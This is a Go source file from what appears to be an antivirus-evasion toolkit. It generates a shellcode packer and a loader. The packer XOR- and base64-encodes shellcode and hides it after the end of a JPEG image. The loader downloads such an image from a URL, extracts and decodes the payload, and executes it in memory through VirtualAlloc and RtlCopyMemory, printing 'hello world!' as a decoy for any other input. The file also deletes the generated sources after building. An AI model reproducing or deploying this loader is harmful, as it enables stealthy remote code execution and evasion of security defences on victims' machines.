package service

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
)

func HouQing(shellcode string, fileName string) {
	func(shellcde string) {
		code := "package main\n\nimport (\n\t\"encoding/base64\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n\t\"syscall\"\n)\n\nconst (\n\tMEM_COMMIT             = 0x1000\n\tMEM_RESERVE            = 0x2000\n\tPAGE_EXECUTE_READWRITE = 0x40\n\tKEY_1   = 58\n\tKEY_2                  = 69\n)\n\nvar (\n\tkernel32      = syscall.MustLoadDLL(\"kernel32.dll\")\n\tntdll         = syscall.MustLoadDLL(\"ntdll.dll\")\n\tVirtualAlloc  = kernel32.MustFindProc(\"VirtualAlloc\")\n\tRtlCopyMemory = ntdll.MustFindProc(\"RtlCopyMemory\")\n)\n\nfunc main() {\n\tvar xor_shellcode []byte\n\txor_shellcode = []byte{" + shellcode + "}\n\tvar shellcode []byte\n\tfor i := 0; i < len(xor_shellcode); i++ {\n\t\tshellcode = append(shellcode, xor_shellcode[i]^KEY_1^KEY_2)\n\t}\n\tdecodeBytes := base64.StdEncoding.EncodeToString(shellcode)\n\tfname := os.Args[1]\n\tcontent, err := ioutil.ReadFile(fname)\n\terr1 := ioutil.WriteFile(\"F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/a.jpg\", content, 0666)\n\tif err1 != nil {\n\t\tfmt.Println(\"write file failed, err:\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"%#v\", content)\n\tif err != nil {\n\t\tfmt.Printf(\"open file faild,err:%s\\n\", err)\n\t\treturn\n\t}\n\tf, err := os.OpenFile(\"./a.jpg\", os.O_CREATE|os.O_RDWR|os.O_APPEND, os.ModeAppend|os.ModePerm)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n\tf.WriteString(decodeBytes)\n\tf.Close()\n\tfmt.Println(\"写入成功!\")\n}"
		loader := "package main\n\nimport (\n\t\"encoding/base64\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n\t\"strings\"\n\t\"syscall\"\n\t\"unsafe\"\n)\n\nconst (\n\tMEM_COMMIT             = 0x1000\n\tMEM_RESERVE            = 0x2000\n\tPAGE_EXECUTE_READWRITE = 0x40\n\tKEY_1                  = 58\n\tKEY_2                  = 69\n)\n\nvar (\n\tkernel32      = syscall.MustLoadDLL(\"kernel32.dll\")\n\tntdll         = syscall.MustLoadDLL(\"ntdll.dll\")\n\tVirtualAlloc  = kernel32.MustFindProc(\"VirtualAlloc\")\n\tRtlCopyMemory = ntdll.MustFindProc(\"RtlCopyMemory\")\n)\n\nfunc main() {\n\timageURL := os.Args[1]\n\tif strings.Contains(imageURL, \".jpg\") && strings.Contains(imageURL, \"http\") {\n\t\tresp, err := http.Get(imageURL)\n\t\tif err != nil {\n\t\t\tos.Exit(1)\n\t\t}\n\t\tb, err := ioutil.ReadAll(resp.Body)\n\t\tresp.Body.Close()\n\t\tif err != nil {\n\t\t\tos.Exit(1)\n\t\t}\n\t\tidx := 0\n\t\tb = []byte(b)\n\t\tfor i := 0; i < len(b); i++ {\n\t\t\tif b[i] == 255 && b[i+1] == 217 {\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tidx++\n\t\t}\n\t\tencodeString := string(b[idx+2:])\n\t\tdecodeBytes, err := base64.StdEncoding.DecodeString(encodeString)\n\t\tif err != nil {\n\t\t\tlog.Fatalln(err)\n\t\t}\n\t\tvar shellcode []byte\n\t\tfor i := 0; i < len(decodeBytes); i++ {\n\t\t\tshellcode = append(shellcode, decodeBytes[i]^KEY_1^KEY_2)\n\t\t}\n\t\taddr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)\n\t\tif err != nil && err.Error() != \"The operation completed successfully.\" {\n\t\t\tsyscall.Exit(0)\n\t\t}\n\t\t_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))\n\t\tif err != nil && err.Error() != \"The operation completed successfully.\" {\n\t\t\tsyscall.Exit(0)\n\t\t}\n\t\tsyscall.Syscall(addr, 0, 0, 0, 0)\n\t} else {\n\t\tfmt.Println(\"hello world!\")\n\t}\n}"
		fileObjCode, err1 := os.OpenFile("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/code/main.go", os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0644) // /aes1/aes/main.go
		if err1 != nil {
			fmt.Println("打开文件出错了:", err1)
			return
		}
		defer fileObjCode.Close()
		wrCode := bufio.NewWriter(fileObjCode)
		wrCode.WriteString(code)
		wrCode.Flush()
		fileObjLoader, err2 := os.OpenFile("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go", os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0644)
		if err2 != nil {
			fmt.Println("打开文件出错了:", err2)
			return
		}
		defer fileObjLoader.Close()
		wrLoader := bufio.NewWriter(fileObjLoader)
		wrLoader.WriteString(loader)
		wrLoader.Flush()
	}(shellcode)
	exec.Command("go", "run", "F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/code/main.go", "F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/code/a.jpg").Run()
	defer Delete_File("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/code/main.go")
	defer Delete_File("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go")
	exec.Command("python", "F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/service/executable/compile.py", "-w", "HouQing", "-f", fileName).Run()
}
